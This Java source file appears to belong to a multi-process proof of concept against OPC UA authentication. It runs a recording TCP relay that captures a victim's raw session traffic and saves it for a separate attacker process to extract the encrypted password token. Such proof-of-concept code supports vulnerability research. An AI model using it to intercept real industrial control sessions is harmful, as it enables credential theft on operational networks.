package poc;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Properties;
import poc.common.Args;
import poc.common.PropsFile;
import poc.common.TcpRecordingProxy;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Process 3 of 5: a transparent, recording TCP relay -- a "dumb pipe."
 *
 * <p>This process does NO OPC UA / UASC parsing of any kind. It records the raw bytes crossing
 * the wire in both directions and, once the connection(s) have gone quiet (no new bytes for
 * {@code --idle-millis}, meaning the victim has finished authenticating and disconnected), writes
 * the two raw byte streams to disk exactly as captured and exits. It does not know what an
 * {@code ActivateSessionRequest} is, does not know where the password ciphertext lives in the
 * stream, and does not extract anything. That extraction is {@code poc.AttackerMain}'s job --
 * this process cannot hand over a "pre-extracted blob" because it never computes one.
 *
 * <p>This process never sees the victim's password: passwords never appear on the wire in
 * plaintext in the first place (the {@code UserNameIdentityToken.password} field is RSA-encrypted
 * before the victim ever sends it), so there is nothing for even a full packet dump to reveal.
 */
public class RelayMain {

  private static final Logger LOGGER = LoggerFactory.getLogger(RelayMain.class);

  public static void main(String[] args) throws Exception {
    Args a = Args.parse(args);
    String targetHost = a.get("target-host", "localhost");
    int targetPort = a.getInt("target-port", -1);
    if (targetPort <= 0) {
      throw new IllegalArgumentException("--target-port is required");
    }
    String c2sFile = a.require("capture-c2s-file");
    String s2cFile = a.require("capture-s2c-file");
    String listenInfoFile = a.get("listen-info-file", null);
    long idleMillis = a.getLong("idle-millis", 1000);
    long maxWaitMillis = a.getLong("max-wait-millis", 30_000);
    int minBytes = a.getInt("min-bytes", 200);

    TcpRecordingProxy proxy = new TcpRecordingProxy(targetHost, targetPort);
    proxy.start();

    if (listenInfoFile != null) {
      Properties listenInfo = new Properties();
      listenInfo.setProperty("port", Integer.toString(proxy.localPort()));
      PropsFile.store(Path.of(listenInfoFile), listenInfo, "relay listen info");
    }
    System.out.println("RELAY_LISTENING port=" + proxy.localPort());
    LOGGER.info(
        "[relay] listening on localhost:{} -> {}:{} (dumb pipe -- no protocol parsing)",
        proxy.localPort(),
        targetHost,
        targetPort);

    // Purely mechanical idle-detection: stop once total recorded bytes (both directions) have
    // stopped growing for `idleMillis`, meaning the proxied connection(s) have gone quiet. No
    // knowledge of UASC framing or OPC UA message types is used here.
    long deadline = System.currentTimeMillis() + maxWaitMillis;
    long lastTotal = -1;
    long lastChangeAt = System.currentTimeMillis();
    byte[] c2s = new byte[0];
    byte[] s2c = new byte[0];
    while (System.currentTimeMillis() < deadline) {
      c2s = proxy.recordedClientToServer();
      s2c = proxy.recordedServerToClient();
      long total = c2s.length + s2c.length;
      long now = System.currentTimeMillis();
      if (total != lastTotal) {
        lastTotal = total;
        lastChangeAt = now;
      } else if (total >= minBytes && now - lastChangeAt >= idleMillis) {
        break;
      }
      Thread.sleep(100);
    }

    LOGGER.info(
        "[relay] recorded {} client->server bytes, {} server->client bytes (raw, unparsed)",
        c2s.length,
        s2c.length);

    if (c2s.length < minBytes) {
      LOGGER.error("[relay] recorded suspiciously little traffic ({} bytes) -- aborting", c2s.length);
      System.exit(1);
      return;
    }

    Files.write(Path.of(c2sFile), c2s);
    Files.write(Path.of(s2cFile), s2c);
    System.out.println(
        "CAPTURE_WRITTEN c2sFile=" + c2sFile + " s2cFile=" + s2cFile
            + " c2sBytes=" + c2s.length + " s2cBytes=" + s2c.length);

    proxy.stop();
  }
}
